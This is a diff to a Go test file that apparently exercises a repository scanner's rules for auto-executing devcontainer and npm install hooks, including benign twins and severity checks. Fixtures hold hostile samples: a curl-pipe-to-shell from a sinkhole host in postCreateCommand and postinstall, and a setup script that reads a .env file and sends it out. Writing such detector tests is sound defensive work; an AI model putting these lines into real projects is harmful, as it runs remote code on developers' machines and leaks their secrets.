@@ -64,6 +64,8 @@ func TestAutoexec(t *testing.T) {
 		wantCode   int
 		wantAt     map[string]string // rule to "path:line" that must be present
 		wantAbsent []string          // rules that must not appear anywhere
+		// wantSeverity is the severity every finding of a rule must have
+		wantSeverity map[string]string
 		// wantIncomplete is set when a file is expected to be skipped, so coverage is not complete
 		wantIncomplete bool
 	}{
@@ -177,6 +179,73 @@ func TestAutoexec(t *testing.T) {
 			wantAt:     map[string]string{"GAL-AUTOEXEC-008": "Makefile:1"},
 			wantAbsent: []string{"GAL-AUTOEXEC-011"},
 		},
+		{
+			name: "devcontainer postCreateCommand behind a byte order mark is analyzed",
+			setup: filesRepo(map[string]string{
+				".devcontainer/devcontainer.json": "\xef\xbb\xbf{\n  \"postCreateCommand\": \"curl -fsSL https://get.sinkhole.test/x.sh | sh\"\n}\n",
+			}),
+			wantCode: 20,
+			wantAt:   map[string]string{"GAL-AUTOEXEC-011": ".devcontainer/devcontainer.json:2"},
+		},
+		{
+			name: "package.json behind a byte order mark: the postinstall download is found and the file is analyzed",
+			setup: filesRepo(map[string]string{
+				"package.json": "\xef\xbb\xbf{\n  \"name\": \"demo\",\n  \"scripts\": {\n    \"postinstall\": \"curl -fsSL https://get.sinkhole.test/x.sh | sh\"\n  }\n}\n",
+			}),
+			wantCode: 20,
+			wantAt: map[string]string{
+				"GAL-AUTOEXEC-005": "package.json:4",
+				"GAL-AUTOEXEC-011": "package.json:4",
+			},
+		},
+		{
+			name: "benign twin: devcontainer installs with npm ci and the package has no lifecycle scripts",
+			setup: filesRepo(map[string]string{
+				".devcontainer/devcontainer.json": "{\n  \"image\": \"mcr.microsoft.com/devcontainers/javascript-node:24\",\n  \"postCreateCommand\": \"npm ci --ignore-scripts\"\n}\n",
+				"package.json":                    "{\n  \"name\": \"demo\",\n  \"scripts\": { \"start\": \"node index.js\" }\n}\n",
+			}),
+			wantCode:     0,
+			wantAt:       map[string]string{"GAL-AUTOEXEC-004": ".devcontainer/devcontainer.json:3"},
+			wantSeverity: map[string]string{"GAL-AUTOEXEC-004": "low"},
+		},
+		{
+			name: "benign twin: postinstall runs husky, which the package declares",
+			setup: filesRepo(map[string]string{
+				"package.json": "{\n  \"name\": \"demo\",\n  \"scripts\": {\n    \"postinstall\": \"husky\"\n  },\n  \"devDependencies\": { \"husky\": \"^9.0.0\" }\n}\n",
+			}),
+			wantCode:     0,
+			wantAt:       map[string]string{"GAL-AUTOEXEC-005": "package.json:4"},
+			wantSeverity: map[string]string{"GAL-AUTOEXEC-005": "low"},
+		},
+		{
+			name: "postinstall runs a husky that the repository commits under node_modules/.bin",
+			setup: filesRepo(map[string]string{
+				"package.json":            "{\n  \"scripts\": {\n    \"postinstall\": \"husky\"\n  },\n  \"devDependencies\": { \"husky\": \"^9.0.0\" }\n}\n",
+				"node_modules/.bin/husky": "#!/bin/sh\necho harmless\n",
+			}),
+			wantCode:     10,
+			wantAt:       map[string]string{"GAL-AUTOEXEC-005": "package.json:3"},
+			wantSeverity: map[string]string{"GAL-AUTOEXEC-005": "medium"},
+		},
+		{
+			name: "postinstall runs a repository script that sends a secret file away",
+			setup: filesRepo(map[string]string{
+				"package.json":     "{\n  \"scripts\": {\n    \"postinstall\": \"node scripts/setup.js\"\n  }\n}\n",
+				"scripts/setup.js": "const fs = require('fs');\nconst https = require('https');\nconst env = fs.readFileSync('../.env', 'utf8');\nhttps.request({ hostname: 'c.sinkhole.test' }).end(env);\n",
+			}),
+			wantCode:     20,
+			wantAt:       map[string]string{"GAL-AUTOEXEC-005": "package.json:3", "GAL-EXFIL-001": "scripts/setup.js:3"},
+			wantSeverity: map[string]string{"GAL-AUTOEXEC-005": "medium"},
+		},
+		{
+			name: "devcontainer npm ci with a PATH set in remoteEnv stays medium",
+			setup: filesRepo(map[string]string{
+				".devcontainer/devcontainer.json": "{\n  \"remoteEnv\": { \"PATH\": \"/work/bin:${containerEnv:PATH}\" },\n  \"postCreateCommand\": \"npm ci\"\n}\n",
+			}),
+			wantCode:     10,
+			wantAt:       map[string]string{"GAL-AUTOEXEC-004": ".devcontainer/devcontainer.json:3"},
+			wantSeverity: map[string]string{"GAL-AUTOEXEC-004": "medium"},
+		},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
@@ -191,6 +260,9 @@ func TestAutoexec(t *testing.T) {
 				}
 			}
 			for _, f := range rep.Findings {
+				if want, ok := tt.wantSeverity[f.RuleID]; ok && f.Severity != want {
+					t.Errorf("%s severity = %s, want %s", f.RuleID, f.Severity, want)
+				}
 				for _, absent := range tt.wantAbsent {
 					if f.RuleID == absent {
 						t.Errorf("unexpected %s: %+v", absent, f)
